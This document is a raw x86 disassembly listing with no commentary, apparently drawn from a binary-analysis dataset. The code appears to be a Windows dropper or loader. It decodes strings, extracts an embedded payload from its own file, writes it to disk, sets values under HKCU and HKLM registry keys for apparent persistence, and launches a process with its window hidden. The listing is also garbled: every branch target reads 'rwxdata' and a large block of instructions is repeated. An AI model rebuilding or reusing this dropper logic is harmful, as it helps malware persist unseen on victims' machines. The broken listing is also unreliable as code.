lea eax [ ebp - 0x260 ]
push eax
call [ ebp - 0x8 ]
push 0x0
lea ecx [ ebp - 0x260 ]
push ecx
call [ ebp - 0x280 ]
mov ecx [ ebp - 0x554 ]
mov edx [ ebp - 0x554 ]
mov al [ ebp + edx - 0x120 ]
mov [ ebp + ecx - 0x260 ] al
jmp rwxdata
mov ecx [ ebp - 0x2b0 ]
mov [ ebp + ecx - 0x260 ] 0x0
mov edx [ ebp - 0x130 ]
mov [ ebp + edx - 0x120 ] 0x0
lea eax [ ebp - 0x120 ]
push eax
call sub_449f70
add esp 0x4
lea ecx [ ebp - 0x260 ]
push ecx
call sub_449f70
add esp 0x4
push 0x104
lea edx [ ebp - 0x120 ]
push edx
call [ ebp - 0x8 ]
mov eax [ ebp - 0x148 ]
add eax 0x1
mov [ ebp - 0x148 ] eax
mov [ ebp - 0x130 ] 0x0
jmp rwxdata
mov ecx [ ebp - 0x2b0 ]
mov edx [ ebp - 0x554 ]
mov al [ ebp + edx - 0x120 ]
mov [ ebp + ecx - 0x260 ] al
jmp rwxdata
mov edx [ ebp - 0x554 ]
add edx 0x1
mov [ ebp - 0x554 ] edx
mov edx [ ebp - 0x130 ]
movsx eax [ ebp + edx - 0x120 ]
test eax eax
je rwxdata
mov ecx [ ebp - 0x554 ]
add ecx 0x1
mov [ ebp - 0x554 ] ecx
mov edx [ ebp - 0x2b0 ]
add edx 0x1
mov [ ebp - 0x2b0 ] edx
mov ecx [ ebp - 0x130 ]
mov [ ebp + ecx - 0x530 ] 0x20
mov edx [ ebp - 0x130 ]
add edx 0x1
mov [ ebp - 0x130 ] edx
mov eax [ ebp - 0x130 ]
mov [ ebp + eax - 0x530 ] 0x2f
mov ecx [ ebp - 0x130 ]
add ecx 0x1
mov [ ebp - 0x130 ] ecx
mov [ ebp - 0x290 ] 0x0
jmp rwxdata
mov ecx [ ebp - 0x130 ]
mov edx [ ebp - 0x130 ]
mov al [ ebp + edx - 0x120 ]
mov [ ebp + ecx - 0x530 ] al
jmp rwxdata
mov eax [ ebp - 0x148 ]
movsx ecx [ eax ]
cmp ecx 0x26
je rwxdata
mov ecx [ ebp - 0x130 ]
add ecx 0x1
mov [ ebp - 0x130 ] ecx
mov ecx [ ebp - 0x130 ]
mov [ ebp + ecx - 0x530 ] 0x0
mov edx [ ebp - 0x148 ]
add edx 0x1
mov [ ebp - 0x148 ] edx
mov eax [ ebp - 0x264 ]
push eax
call sub_449f70
add esp 0x4
mov ecx [ ebp - 0x144 ]
and ecx 0x1
je rwxdata
mov edx [ ebp - 0x290 ]
imul edx edx 0xa
mov eax [ ebp - 0x148 ]
movsx ecx [ eax ]
lea edx [ edx + ecx - 0x30 ]
mov [ ebp - 0x290 ] edx
mov eax [ ebp - 0x130 ]
mov ecx [ ebp - 0x148 ]
mov dl [ ecx ]
mov [ ebp + eax - 0x530 ] dl
mov eax [ ebp - 0x130 ]
add eax 0x1
mov [ ebp - 0x130 ] eax
jmp rwxdata
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x290 ]
jae rwxdata
mov edx [ ebp - 0x144 ]
and edx 0x10
je rwxdata
mov edx [ ebp - 0x148 ]
add edx 0x1
mov [ ebp - 0x148 ] edx
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x290 ]
ja rwxdata
mov ecx [ ebp - 0x264 ]
add ecx 0x30
push ecx
call sub_449f70
add esp 0x4
lea edx [ ebp - 0x27c ]
push edx
lea eax [ ebp - 0x138 ]
push eax
push 0x0
push 0xf003f
push 0x0
push 0x0
push 0x0
mov ecx [ ebp - 0x264 ]
add ecx 0x30
push ecx
push 0x80000001
call [ ebp - 0x4 ]
mov [ ebp - 0x2b4 ] eax
cmp [ ebp - 0x2b4 ] 0x0
jne rwxdata
lea eax [ ebp - 0x27c ]
push eax
lea ecx [ ebp - 0x138 ]
push ecx
push 0x0
push 0xf003f
push 0x0
push 0x0
push 0x0
mov edx [ ebp - 0x264 ]
push edx
push 0x80000001
call [ ebp - 0x4 ]
mov [ ebp - 0x2b4 ] eax
lea eax [ ebp - 0x27c ]
push eax
lea ecx [ ebp - 0x138 ]
push ecx
push 0x0
push 0xf003f
push 0x0
push 0x0
push 0x0
mov edx [ ebp - 0x264 ]
push edx
push 0x80000002
call [ ebp - 0x4 ]
mov [ ebp - 0x2b4 ] eax
jmp rwxdata
mov ecx [ ebp - 0x18 ]
cmp ecx [ ebp - 0x290 ]
jae rwxdata
mov edx [ ebp - 0x264 ]
add edx 0x70
push edx
call sub_449f70
add esp 0x4
mov eax [ ebp - 0x264 ]
add eax 0x70
push eax
mov ecx [ ebp - 0x138 ]
push ecx
call [ ebp - 0x298 ]
mov [ ebp - 0x2b4 ] eax
mov edx [ ebp - 0x138 ]
push edx
call [ ebp - 0x534 ]
mov [ ebp - 0x130 ] 0x0
jmp rwxdata
cmp [ ebp - 0x2b4 ] 0x0
jne rwxdata
push 0x0
push 0x80
push 0x1
push 0x0
push 0x1
push 0x40000000
lea eax [ ebp - 0x120 ]
push eax
call [ ebp - 0x418 ]
mov [ ebp - 0x558 ] eax
push 0x0
push 0x80
push 0x2
push 0x0
push 0x1
push 0x40000000
lea edx [ ebp - 0x120 ]
push edx
call [ ebp - 0x418 ]
mov [ ebp - 0x558 ] eax
jmp rwxdata
cmp [ ebp - 0x130 ] 0xa
jae rwxdata
push 0xfb18
mov ecx [ ebp - 0x148 ]
push ecx
call sub_44a0a0
add esp 0x8
push 0x0
lea edx [ ebp - 0x550 ]
push edx
push 0xfb18
mov eax [ ebp - 0x148 ]
push eax
mov ecx [ ebp - 0x558 ]
push ecx
call [ ebp - 0x28c ]
mov edx [ ebp - 0x558 ]
push edx
call [ ebp - 0x13c ]
mov eax [ ebp - 0x144 ]
and eax 0x100
je rwxdata
cmp [ ebp - 0x558 ] 0xffffffff
je rwxdata
cmp [ ebp - 0x2b4 ] 0x0
jne rwxdata
lea ecx [ ebp - 0x134 ]
push ecx
lea edx [ ebp - 0x410 ]
push edx
lea eax [ ebp - 0x10 ]
push eax
push 0x0
lea ecx [ ebp - 0x260 ]
push ecx
mov edx [ ebp - 0x138 ]
push edx
call [ ebp - 0x414 ]
mov [ ebp - 0x2b4 ] eax
cmp [ ebp - 0x2b4 ] 0x0
jne rwxdata
mov [ ebp - 0x574 ] 0x44
mov [ ebp - 0x2ac ] 0x0
jmp rwxdata
mov [ ebp - 0x130 ] 0x0
jmp rwxdata
jmp rwxdata
jmp rwxdata
mov [ ebp - 0x300 ] 0x44
mov [ ebp - 0x2d4 ] 0x81
mov eax [ ebp - 0x144 ]
and eax 0x1000
je rwxdata
mov ecx [ ebp - 0x574 ]
sub ecx 0x1
mov [ ebp - 0x574 ] ecx
mov edx [ ebp - 0x574 ]
mov [ ebp + edx - 0x300 ] 0x0
jmp rwxdata
mov ecx [ ebp - 0x2ac ]
movsx edx [ ebp + ecx - 0x530 ]
test edx edx
je rwxdata
mov ecx [ ebp - 0x130 ]
movsx edx [ ebp + ecx - 0x410 ]
cmp edx 0x2f
je rwxdata
mov eax [ ebp - 0x130 ]
add eax 0x1
mov [ ebp - 0x130 ] eax
mov edx 0x5
mov [ ebp - 0x2d0 ] dx
xor ecx ecx
mov [ ebp - 0x2d0 ] cx
jmp rwxdata
cmp [ ebp - 0x574 ] 0x0
je rwxdata
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x290 ]
jae rwxdata
jmp rwxdata
mov edx [ ebp - 0x130 ]
movsx eax [ ebp + edx - 0x410 ]
cmp eax 0x2f
jne rwxdata
mov eax [ ebp - 0x130 ]
movsx ecx [ ebp + eax - 0x410 ]
test ecx ecx
je rwxdata
lea eax [ ebp - 0x278 ]
push eax
lea ecx [ ebp - 0x300 ]
push ecx
push 0x0
push 0x0
push 0x20
push 0x0
push 0x0
push 0x0
lea edx [ ebp - 0x120 ]
push edx
push 0x0
call [ ebp - 0x55c ]
mov edx [ ebp - 0x138 ]
push edx
call [ ebp - 0x534 ]
mov ecx [ ebp - 0x2ac ]
push ecx
lea edx [ ebp - 0x530 ]
push edx
push 0x1
push 0x0
lea eax [ ebp - 0x260 ]
push eax
mov ecx [ ebp - 0x138 ]
push ecx
call [ ebp - 0x268 ]
mov [ ebp - 0x2b4 ] eax
mov eax [ ebp - 0x2ac ]
add eax 0x1
mov [ ebp - 0x2ac ] eax
mov ecx [ ebp - 0x130 ]
add ecx 0x1
mov [ ebp - 0x130 ] ecx
jmp rwxdata
jmp rwxdata
mov eax [ ebp - 0x130 ]
movsx ecx [ ebp + eax - 0x410 ]
test ecx ecx
je rwxdata
mov eax [ ebp - 0x130 ]
add eax 0x1
mov [ ebp - 0x130 ] eax
mov edx [ ebp - 0x18 ]
imul edx edx 0xa
mov eax [ ebp - 0x130 ]
movsx ecx [ ebp + eax - 0x410 ]
lea edx [ edx + ecx - 0x30 ]
mov [ ebp - 0x18 ] edx
jmp rwxdata
mov edx [ ebp - 0x130 ]
add edx 0x1
mov [ ebp - 0x130 ] edx
sub_44927d
nop
pop [ ebp - 0x12c ]
mov eax [ ebp - 0x12c ]
sub eax 0x24c
mov [ ebp - 0x284 ] eax
mov [ ebp - 0x540 ] 0x0
mov [ ebp - 0x2a8 ] 0x0
mov [ ebp - 0x420 ] 0x0
mov [ ebp - 0x144 ] 0x0
mov ecx [ ebp - 0x284 ]
mov edx [ ecx ]
mov [ ebp - 0x420 ] edx
mov eax [ ebp - 0x284 ]
add eax 0x4
mov [ ebp - 0x140 ] eax
mov ecx [ ebp - 0x140 ]
push ecx
call sub_449f70
add esp 0x4
call sub_44a130
mov [ ebp - 0x54c ] eax
mov edx [ ebp - 0x140 ]
push edx
mov eax [ ebp - 0x54c ]
push eax
call sub_44a160
add esp 0x8
mov [ ebp - 0x540 ] eax
mov ecx [ ebp - 0x284 ]
mov edx [ ecx + 0x1c ]
mov [ ebp - 0x144 ] edx
mov [ ebp - 0x548 ] 0x0
mov [ ebp - 0x53c ] 0x0
mov eax [ ebp - 0x284 ]
add eax 0xa0
mov [ ebp - 0x2a4 ] eax
mov ecx [ ebp - 0x284 ]
add ecx 0x1f0
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x284 ]
add edx 0xd0
mov [ ebp - 0x128 ] edx
mov [ ebp - 0x124 ] 0x0
mov [ ebp - 0x150 ] 0x0
mov eax [ ebp - 0x12c ]
sub eax 0x1
mov [ ebp - 0x12c ] eax
mov ecx [ ebp - 0x12c ]
mov edx [ ecx ]
mov [ ebp - 0x154 ] edx
jmp rwxdata
mov [ ebp - 0x2a0 ] 0x0
mov [ ebp - 0x41c ] 0x0
mov [ ebp - 0x418 ] 0x0
mov [ ebp - 0x13c ] 0x0
mov [ ebp - 0x14c ] 0x0
mov [ ebp - 0x29c ] 0x0
mov [ ebp - 0x538 ] 0x0
mov [ ebp - 0x544 ] 0x0
mov [ ebp - 0x280 ] 0x0
mov [ ebp - 0x28c ] 0x0
mov [ ebp - 0x55c ] 0x0
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x534 ] 0x0
mov [ ebp - 0x268 ] 0x0
mov [ ebp - 0x414 ] 0x0
mov [ ebp - 0x298 ] 0x0
mov edx [ ebp - 0x284 ]
add edx 0x1f0
mov [ ebp - 0x124 ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax ]
mov [ ebp - 0x2a0 ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x4 ]
mov [ ebp - 0x41c ] eax
mov ecx [ ebp - 0x124 ]
mov edx [ ecx + 0x8 ]
mov [ ebp - 0x418 ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax + 0xc ]
mov [ ebp - 0x13c ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x10 ]
mov [ ebp - 0x14c ] eax
mov ecx [ ebp - 0x124 ]
mov edx [ ecx + 0x14 ]
mov [ ebp - 0x29c ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax + 0x18 ]
mov [ ebp - 0x538 ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x1c ]
mov [ ebp - 0x544 ] eax
mov ecx [ ebp - 0x124 ]
mov edx [ ecx + 0x20 ]
mov [ ebp - 0x280 ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax + 0x24 ]
mov [ ebp - 0x28c ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x28 ]
mov [ ebp - 0x55c ] eax
mov ecx [ ebp - 0x124 ]
mov edx [ ecx + 0x2c ]
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax + 0x30 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x34 ]
mov [ ebp - 0x534 ] eax
mov ecx [ ebp - 0x124 ]
mov edx [ ecx + 0x38 ]
mov [ ebp - 0x268 ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax + 0x3c ]
mov [ ebp - 0x414 ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x40 ]
mov [ ebp - 0x298 ] eax
mov [ ebp - 0x264 ] 0x0
mov ecx [ ebp - 0x284 ]
add ecx 0x20
mov [ ebp - 0x264 ] ecx
mov [ ebp - 0x2b4 ] 0x0
mov [ ebp - 0x18 ] 0x0
push 0x103
lea edx [ ebp - 0x120 ]
push edx
push 0x0
call [ ebp - 0x41c ]
push 0x0
push 0x0
push 0x3
push 0x0
push 0x1
push 0x80000000
lea eax [ ebp - 0x120 ]
push eax
call [ ebp - 0x418 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0xffffffff
je rwxdata
mov eax [ ebp - 0x548 ]
push eax
call [ ebp - 0x540 ]
mov [ ebp - 0x150 ] eax
cmp [ ebp - 0x150 ] 0x0
jne rwxdata
cmp [ ebp - 0x154 ] 0x652a5e26
je rwxdata
call [ ebp - 0x420 ]
xor eax eax
mov esp ebp
pop ebp
retn
push 0x0
mov ecx [ ebp - 0xc ]
push ecx
call [ ebp - 0x14c ]
mov [ ebp - 0x288 ] eax
cmp [ ebp - 0x288 ] 0xc800000
ja rwxdata
mov ecx [ ebp - 0x128 ]
mov [ ebp - 0x53c ] ecx
mov edx [ ebp - 0x53c ]
movsx eax [ edx ]
test eax eax
je rwxdata
jmp rwxdata
mov ecx [ ebp - 0xc ]
push ecx
call [ ebp - 0x13c ]
push 0x4
push 0x1000
mov edx [ ebp - 0x288 ]
push edx
push 0x0
call [ ebp - 0x29c ]
mov [ ebp - 0x294 ] eax
cmp [ ebp - 0x294 ] 0x0
je rwxdata
mov edx [ ebp - 0x128 ]
add edx 0x5
mov [ ebp - 0x128 ] edx
mov eax [ ebp - 0x548 ]
mov [ ebp - 0x570 ] eax
mov [ ebp - 0x56c ] 0x0
mov ecx [ ebp - 0x53c ]
push ecx
mov edx [ ebp - 0x150 ]
push edx
call sub_44a160
add esp 0x8
mov [ ebp - 0x124 ] eax
mov [ ebp - 0x560 ] 0x4
push 0x0
lea eax [ ebp - 0x550 ]
push eax
mov ecx [ ebp - 0x288 ]
push ecx
mov edx [ ebp - 0x294 ]
push edx
mov eax [ ebp - 0xc ]
push eax
call [ ebp - 0x544 ]
mov ecx [ ebp - 0x550 ]
mov edx [ ebp - 0x294 ]
lea eax [ edx + ecx - 0x3 ]
mov [ ebp - 0x148 ] eax
jmp rwxdata
mov edx [ ebp - 0x56c ]
mov eax [ ebp - 0x2a4 ]
lea ecx [ eax + edx + 0x1 ]
mov [ ebp - 0x2a4 ] ecx
jmp rwxdata
mov ecx [ ebp - 0x570 ]
movsx edx [ ecx ]
mov eax [ ebp - 0x570 ]
add eax 0x1
mov [ ebp - 0x570 ] eax
test edx edx
je rwxdata
mov edx [ ebp - 0x14 ]
add edx 0x4
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0x53c ]
mov [ ebp - 0x568 ] eax
mov [ ebp - 0x564 ] 0x0
mov edx [ ebp - 0x14 ]
add edx [ ebp - 0x560 ]
mov eax [ ebp - 0x560 ]
mov cl [ ebp + eax - 0x124 ]
mov [ edx ] cl
jmp rwxdata
mov edx [ ebp - 0x148 ]
cmp edx [ ebp - 0x294 ]
jbe rwxdata
mov eax [ ebp - 0x2a4 ]
mov [ ebp - 0x548 ] eax
mov ecx [ ebp - 0x548 ]
movsx edx [ ecx ]
test edx edx
je rwxdata
mov ecx [ ebp - 0x56c ]
add ecx 0x1
mov [ ebp - 0x56c ] ecx
jmp rwxdata
mov edx [ ebp - 0x564 ]
mov eax [ ebp - 0x128 ]
lea ecx [ eax + edx + 0x1 ]
mov [ ebp - 0x128 ] ecx
jmp rwxdata
mov ecx [ ebp - 0x568 ]
movsx edx [ ecx ]
mov eax [ ebp - 0x568 ]
add eax 0x1
mov [ ebp - 0x568 ] eax
test edx edx
je rwxdata
mov eax [ ebp - 0x560 ]
mov ecx [ ebp - 0x560 ]
sub ecx 0x1
mov [ ebp - 0x560 ] ecx
test eax eax
je rwxdata
mov eax [ ebp - 0x148 ]
cmp eax [ ebp - 0x294 ]
jbe rwxdata
mov eax [ ebp - 0x148 ]
movsx ecx [ eax ]
cmp ecx 0x36
jne rwxdata
cmp [ ebp - 0x570 ] 0x0
je rwxdata
mov ecx [ ebp - 0x564 ]
add ecx 0x1
mov [ ebp - 0x564 ] ecx
jmp rwxdata
push 0x8000
push 0x0
mov eax [ ebp - 0x294 ]
push eax
call [ ebp - 0x538 ]
mov ecx [ ebp - 0x148 ]
add ecx 0x4
mov [ ebp - 0x148 ] ecx
mov [ ebp - 0x130 ] 0x0
jmp rwxdata
jmp rwxdata
mov edx [ ebp - 0x148 ]
movsx eax [ edx + 0x1 ]
cmp eax 0x2a
jne rwxdata
cmp [ ebp - 0x568 ] 0x0
je rwxdata
mov ecx [ ebp - 0x148 ]
movsx edx [ ecx ]
cmp edx 0x3a
je rwxdata
mov ecx [ ebp - 0x148 ]
sub ecx 0x1
mov [ ebp - 0x148 ] ecx
mov ecx [ ebp - 0x148 ]
movsx edx [ ecx + 0x2 ]
cmp edx 0x23
jne rwxdata
mov edx [ ebp - 0x130 ]
sub edx 0x1
mov [ ebp - 0x554 ] edx
jmp rwxdata
mov eax [ ebp - 0x130 ]
mov ecx [ ebp - 0x148 ]
mov dl [ ecx ]
mov [ ebp + eax - 0x120 ] dl
mov eax [ ebp - 0x148 ]
movsx ecx [ eax ]
cmp ecx 0x2e
jne rwxdata
jmp rwxdata
mov ecx [ ebp - 0x554 ]
movsx edx [ ebp + ecx - 0x120 ]
cmp edx 0x2e
je rwxdata
jmp rwxdata
mov [ ebp - 0x554 ] 0x0
jmp rwxdata
mov [ ebp - 0x2b0 ] 0x0
mov eax [ ebp - 0x554 ]
add eax 0x1
mov [ ebp - 0x554 ] eax
jmp rwxdata
jmp rwxdata
mov edx [ ebp - 0x130 ]
add edx 0x1
mov [ ebp - 0x130 ] edx
mov eax [ ebp - 0x148 ]
add eax 0x1
mov [ ebp - 0x148 ] eax
mov eax [ ebp - 0x554 ]
cmp eax [ ebp - 0x130 ]
jae rwxdata
mov eax [ ebp - 0x554 ]
cmp eax [ ebp - 0x130 ]
jae rwxdata
mov eax [ ebp - 0x554 ]
sub eax 0x1
mov [ ebp - 0x554 ] eax
mov ecx [ ebp - 0x554 ]
mov [ ebp + ecx - 0x260 ] 0x0
lea edx [ ebp - 0x260 ]
push edx
call sub_449f70
add esp 0x4
push 0x104
lea eax [ ebp - 0x260 ]
push eax
call [ ebp - 0x8 ]
push 0x0
lea ecx [ ebp - 0x260 ]
push ecx
call [ ebp - 0x280 ]
mov ecx [ ebp - 0x554 ]
mov edx [ ebp - 0x554 ]
mov al [ ebp + edx - 0x120 ]
mov [ ebp + ecx - 0x260 ] al
jmp rwxdata
mov ecx [ ebp - 0x2b0 ]
mov [ ebp + ecx - 0x260 ] 0x0
mov edx [ ebp - 0x130 ]
mov [ ebp + edx - 0x120 ] 0x0
lea eax [ ebp - 0x120 ]
push eax
call sub_449f70
add esp 0x4
lea ecx [ ebp - 0x260 ]
push ecx
call sub_449f70
add esp 0x4
push 0x104
lea edx [ ebp - 0x120 ]
push edx
call [ ebp - 0x8 ]
mov eax [ ebp - 0x148 ]
add eax 0x1
mov [ ebp - 0x148 ] eax
mov [ ebp - 0x130 ] 0x0
jmp rwxdata
mov ecx [ ebp - 0x2b0 ]
mov edx [ ebp - 0x554 ]
mov al [ ebp + edx - 0x120 ]
mov [ ebp + ecx - 0x260 ] al
jmp rwxdata
mov edx [ ebp - 0x554 ]
add edx 0x1
mov [ ebp - 0x554 ] edx
mov edx [ ebp - 0x130 ]
movsx eax [ ebp + edx - 0x120 ]
test eax eax
je rwxdata
mov ecx [ ebp - 0x554 ]
add ecx 0x1
mov [ ebp - 0x554 ] ecx
mov edx [ ebp - 0x2b0 ]
add edx 0x1
mov [ ebp - 0x2b0 ] edx
mov ecx [ ebp - 0x130 ]
mov [ ebp + ecx - 0x530 ] 0x20
mov edx [ ebp - 0x130 ]
add edx 0x1
mov [ ebp - 0x130 ] edx
mov eax [ ebp - 0x130 ]
mov [ ebp + eax - 0x530 ] 0x2f
mov ecx [ ebp - 0x130 ]
add ecx 0x1
mov [ ebp - 0x130 ] ecx
mov [ ebp - 0x290 ] 0x0
jmp rwxdata
mov ecx [ ebp - 0x130 ]
mov edx [ ebp - 0x130 ]
mov al [ ebp + edx - 0x120 ]
mov [ ebp + ecx - 0x530 ] al
jmp rwxdata
mov eax [ ebp - 0x148 ]
movsx ecx [ eax ]
cmp ecx 0x26
je rwxdata
mov ecx [ ebp - 0x130 ]
add ecx 0x1
mov [ ebp - 0x130 ] ecx
mov ecx [ ebp - 0x130 ]
mov [ ebp + ecx - 0x530 ] 0x0
mov edx [ ebp - 0x148 ]
add edx 0x1
mov [ ebp - 0x148 ] edx
mov eax [ ebp - 0x264 ]
push eax
call sub_449f70
add esp 0x4
mov ecx [ ebp - 0x144 ]
and ecx 0x1
je rwxdata
mov edx [ ebp - 0x290 ]
imul edx edx 0xa
mov eax [ ebp - 0x148 ]
movsx ecx [ eax ]
lea edx [ edx + ecx - 0x30 ]
mov [ ebp - 0x290 ] edx
mov eax [ ebp - 0x130 ]
mov ecx [ ebp - 0x148 ]
mov dl [ ecx ]
mov [ ebp + eax - 0x530 ] dl
mov eax [ ebp - 0x130 ]
add eax 0x1
mov [ ebp - 0x130 ] eax
jmp rwxdata
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x290 ]
jae rwxdata
mov edx [ ebp - 0x144 ]
and edx 0x10
je rwxdata
mov edx [ ebp - 0x148 ]
add edx 0x1
mov [ ebp - 0x148 ] edx
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x290 ]
ja rwxdata
mov ecx [ ebp - 0x264 ]
add ecx 0x30
push ecx
call sub_449f70
add esp 0x4
lea edx [ ebp - 0x27c ]
push edx
lea eax [ ebp - 0x138 ]
push eax
push 0x0
push 0xf003f
push 0x0
push 0x0
push 0x0
mov ecx [ ebp - 0x264 ]
add ecx 0x30
push ecx
push 0x80000001
call [ ebp - 0x4 ]
mov [ ebp - 0x2b4 ] eax
cmp [ ebp - 0x2b4 ] 0x0
jne rwxdata
lea eax [ ebp - 0x27c ]
push eax
lea ecx [ ebp - 0x138 ]
push ecx
push 0x0
push 0xf003f
push 0x0
push 0x0
push 0x0
mov edx [ ebp - 0x264 ]
push edx
push 0x80000001
call [ ebp - 0x4 ]
mov [ ebp - 0x2b4 ] eax
lea eax [ ebp - 0x27c ]
push eax
lea ecx [ ebp - 0x138 ]
push ecx
push 0x0
push 0xf003f
push 0x0
push 0x0
push 0x0
mov edx [ ebp - 0x264 ]
push edx
push 0x80000002
call [ ebp - 0x4 ]
mov [ ebp - 0x2b4 ] eax
jmp rwxdata
mov ecx [ ebp - 0x18 ]
cmp ecx [ ebp - 0x290 ]
jae rwxdata
mov edx [ ebp - 0x264 ]
add edx 0x70
push edx
call sub_449f70
add esp 0x4
mov eax [ ebp - 0x264 ]
add eax 0x70
push eax
mov ecx [ ebp - 0x138 ]
push ecx
call [ ebp - 0x298 ]
mov [ ebp - 0x2b4 ] eax
mov edx [ ebp - 0x138 ]
push edx
call [ ebp - 0x534 ]
mov [ ebp - 0x130 ] 0x0
jmp rwxdata
cmp [ ebp - 0x2b4 ] 0x0
jne rwxdata
push 0x0
push 0x80
push 0x1
push 0x0
push 0x1
push 0x40000000
lea eax [ ebp - 0x120 ]
push eax
call [ ebp - 0x418 ]
mov [ ebp - 0x558 ] eax
push 0x0
push 0x80
push 0x2
push 0x0
push 0x1
push 0x40000000
lea edx [ ebp - 0x120 ]
push edx
call [ ebp - 0x418 ]
mov [ ebp - 0x558 ] eax
jmp rwxdata
cmp [ ebp - 0x130 ] 0xa
jae rwxdata
push 0xfb18
mov ecx [ ebp - 0x148 ]
push ecx
call sub_44a0a0
add esp 0x8
push 0x0
lea edx [ ebp - 0x550 ]
push edx
push 0xfb18
mov eax [ ebp - 0x148 ]
push eax
mov ecx [ ebp - 0x558 ]
push ecx
call [ ebp - 0x28c ]
mov edx [ ebp - 0x558 ]
push edx
call [ ebp - 0x13c ]
mov eax [ ebp - 0x144 ]
and eax 0x100
je rwxdata
cmp [ ebp - 0x558 ] 0xffffffff
je rwxdata
cmp [ ebp - 0x2b4 ] 0x0
jne rwxdata
lea ecx [ ebp - 0x134 ]
push ecx
lea edx [ ebp - 0x410 ]
push edx
lea eax [ ebp - 0x10 ]
push eax
push 0x0
lea ecx [ ebp - 0x260 ]
push ecx
mov edx [ ebp - 0x138 ]
push edx
call [ ebp - 0x414 ]
mov [ ebp - 0x2b4 ] eax
cmp [ ebp - 0x2b4 ] 0x0
jne rwxdata
mov [ ebp - 0x574 ] 0x44
mov [ ebp - 0x2ac ] 0x0
jmp rwxdata
mov [ ebp - 0x130 ] 0x0
jmp rwxdata
jmp rwxdata
jmp rwxdata
mov [ ebp - 0x300 ] 0x44
mov [ ebp - 0x2d4 ] 0x81
mov eax [ ebp - 0x144 ]
and eax 0x1000
je rwxdata
mov ecx [ ebp - 0x574 ]
sub ecx 0x1
mov [ ebp - 0x574 ] ecx
mov edx [ ebp - 0x574 ]
mov [ ebp + edx - 0x300 ] 0x0
jmp rwxdata
mov ecx [ ebp - 0x2ac ]
movsx edx [ ebp + ecx - 0x530 ]
test edx edx
je rwxdata
mov ecx [ ebp - 0x130 ]
movsx edx [ ebp + ecx - 0x410 ]
cmp edx 0x2f
je rwxdata
mov eax [ ebp - 0x130 ]
add eax 0x1
mov [ ebp - 0x130 ] eax
mov edx 0x5
mov [ ebp - 0x2d0 ] dx
xor ecx ecx
mov [ ebp - 0x2d0 ] cx
jmp rwxdata
cmp [ ebp - 0x574 ] 0x0
je rwxdata
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x290 ]
jae rwxdata
jmp rwxdata
mov edx [ ebp - 0x130 ]
movsx eax [ ebp + edx - 0x410 ]
cmp eax 0x2f
jne rwxdata
mov eax [ ebp - 0x130 ]
movsx ecx [ ebp + eax - 0x410 ]
test ecx ecx
je rwxdata
lea eax [ ebp - 0x278 ]
push eax
lea ecx [ ebp - 0x300 ]
push ecx
push 0x0
push 0x0
push 0x20
push 0x0
push 0x0
push 0x0
lea edx [ ebp - 0x120 ]
push edx
push 0x0
call [ ebp - 0x55c ]
mov edx [ ebp - 0x138 ]
push edx
call [ ebp - 0x534 ]
mov ecx [ ebp - 0x2ac ]
push ecx
lea edx [ ebp - 0x530 ]
push edx
push 0x1
push 0x0
lea eax [ ebp - 0x260 ]
push eax
mov ecx [ ebp - 0x138 ]
push ecx
call [ ebp - 0x268 ]
mov [ ebp - 0x2b4 ] eax
mov eax [ ebp - 0x2ac ]
add eax 0x1
mov [ ebp - 0x2ac ] eax
mov ecx [ ebp - 0x130 ]
add ecx 0x1
mov [ ebp - 0x130 ] ecx
jmp rwxdata
jmp rwxdata
mov eax [ ebp - 0x130 ]
movsx ecx [ ebp + eax - 0x410 ]
test ecx ecx
je rwxdata
mov eax [ ebp - 0x130 ]
add eax 0x1
mov [ ebp - 0x130 ] eax
mov edx [ ebp - 0x18 ]
imul edx edx 0xa
mov eax [ ebp - 0x130 ]
movsx ecx [ ebp + eax - 0x410 ]
lea edx [ edx + ecx - 0x30 ]
mov [ ebp - 0x18 ] edx
jmp rwxdata
mov edx [ ebp - 0x130 ]
add edx 0x1
mov [ ebp - 0x130 ] edx
sub_449f70
push ebp
mov ebp esp
sub esp 0x24
mov [ ebp - 0x14 ] 0x1
mov [ ebp - 0x13 ] 0x1
mov [ ebp - 0x12 ] 0x2
mov [ ebp - 0x11 ] 0x10
mov [ ebp - 0x10 ] 0x4
mov [ ebp - 0xf ] 0x4
mov [ ebp - 0xe ] 0x8
mov [ ebp - 0xd ] 0x8
mov [ ebp - 0xc ] 0x10
mov [ ebp - 0xb ] 0x2
mov [ ebp - 0xa ] 0x20
mov [ ebp - 0x9 ] 0x40
mov [ ebp - 0x8 ] 0x40
mov [ ebp - 0x7 ] 0x20
mov [ ebp - 0x6 ] 0x80
mov [ ebp - 0x5 ] 0x80
mov [ ebp - 0x4 ] 0x0
jmp rwxdata
mov ecx [ ebp + 0x8 ]
add ecx [ ebp - 0x4 ]
movsx edx [ ecx ]
test edx edx
je rwxdata
mov [ ebp - 0x1c ] 0x0
jmp rwxdata
jmp rwxdata
mov ecx [ ebp - 0x1c ]
cmp ecx [ ebp - 0x4 ]
jge rwxdata
mov eax [ ebp - 0x4 ]
add eax 0x1
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x4 ]
sub ecx 0x1
mov [ ebp - 0x4 ] ecx
jmp rwxdata
mov [ ebp - 0x15 ] 0x0
mov [ ebp - 0x20 ] 0x0
